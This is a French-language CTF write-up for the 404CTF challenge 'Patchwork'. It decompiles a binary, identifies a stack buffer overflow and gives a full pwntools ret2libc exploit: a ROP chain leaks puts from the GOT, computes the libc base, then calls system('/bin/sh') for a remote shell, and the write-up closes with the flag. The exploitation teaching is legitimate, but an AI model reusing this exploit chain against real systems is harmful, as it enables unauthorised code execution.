# Patchwork

> Agent, suite aux précieuses informations que vous nous avez communiquées, nous avons pu continuer nos recherches sur les méthodes employées par Hallebarde pour rentrer en contact avec les scientifiques français. Nous avons récemment trouvé ce qui semble être un portail de recrutement de Hallebarde. Essayez d'obtenir d'autres informations à ce sujet ou introduisez-vous dans le réseau de Hallebarde.
>
> nc challenge.404ctf.fr 30690

En plus du binaire, on nous donne gracieusement la librairie utilisée.

## Description

Reversons le binaire avec Ghidra, la fonction `main` est la suivante :

```c
undefined8 main(void)
{
  char local_88 [64];
  char local_48 [56];
  char *local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts(&DAT_00400788);
  puts(&DAT_004007f8);
  fgets(local_88,0x32,stdin);
  local_10 = strstr(local_88,"scientifique");
  if (local_10 == (char *)0x0) {
    puts(&DAT_004008d4);
  }
  else {
    puts(&DAT_00400840);
    fgets(local_48,0x78,stdin);
    puts("Merci, nous reviendrons vers vous sous peu.");
  }
  return 0;
}
```

On remarque un buffer overflow sur `local_48`: on peut entrer 0x78 caractères mais le buffer n'en fait que 56.

Contrairement au challenge [SansProtection](SansProtection.md), cette fois ci des protections sont présentes:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Heureusement pour nous, pas de canary ni PIE, donc on va pouvoir effectuer un ret2libc.

### ret2libc

Comme on ne peut pas entrer notre propre shellcode car la stack n'est pas exécutable, le principe est d'utiliser la bibliothèque C qui comporte déjà les fonctions que l'on souhaite pour lancer un shell.

L'objectif est d'effectuer l'appel de fonction `system("/bin/sh")`.
Pour ce faire, on a plusieurs étapes:
1) trouver l'adresse de base de la libc (pour trouver l'adresse en mémoire de `system` et de la chaîne de caractères `/bin/sh`);
2) mettre la chaîne de caractère dans le registre `rdi` grâce à un gadget;
3) Effectuer l'appel à la fonction.

## Solution

Le code suivant permet d'effectuer l'attaque:

```python
#!/usr/bin/env python3
from pwn import *

## Launching the program (remote, local or with GDB)
elf = ELF("./recrutement")
rop = ROP(elf)
libc = ELF("libc.so.6")

context.binary = elf
addr = "challenge.404ctf.fr"
port = 30690

def conn():
    if args.LOCAL:
        if args.GDB:
            r = process(["gdb", elf.path])
            r.recvuntil(b"gef\xe2\x9e\xa4")
            r.sendline(b"r")
        else:
            r = process([elf.path])
    else:
        r = remote(addr, port)

    return r

# OFFSET needed to overflow the buffer until the saved rip
OFFSET = b"a" * (56 + 8 + 8)

# address of MAIN
MAIN = elf.symbols['main']

def get_addr(sh, func_name):
    PUTS_PLT = elf.plt['puts']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0]
    FUNC_GOT = elf.got[func_name]
    print(func_name + " GOT @ " + hex(FUNC_GOT))
    
    payload = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(RET) + p64(MAIN) 
    sh.sendline(payload)
    sh.recvline()

    recv = sh.recvline().strip()
    leak = u64(recv.ljust(8, "\x00".encode()))
    print("Leaked libc address,  "+func_name+": "+ hex(leak))
    libc.address = leak - libc.symbols[func_name]
    
    return leak

def launch_shell(sh):
    SYSTEM = libc.symbols["system"]
    BINSH = next(libc.search(b"/bin/sh"))
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    
    payload = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
    sh.sendline(payload)

def main():
    r = conn()
    r.recvuntil(b"profession :\n")
    r.sendline(b"scientifique")
    r.recvuntil(b"candidature :\n")
    
    get_addr(r, "puts")
    r.recvuntil(b"profession :\n")
    r.sendline(b"scientifique")
    r.recvuntil(b"candidature :\n")
    

    launch_shell(r)

    r.interactive()


if __name__ == "__main__":
    main()
```

Flag : `404CTF{C3_r3CrU73M3N7_N357_P45_53CUr153!}`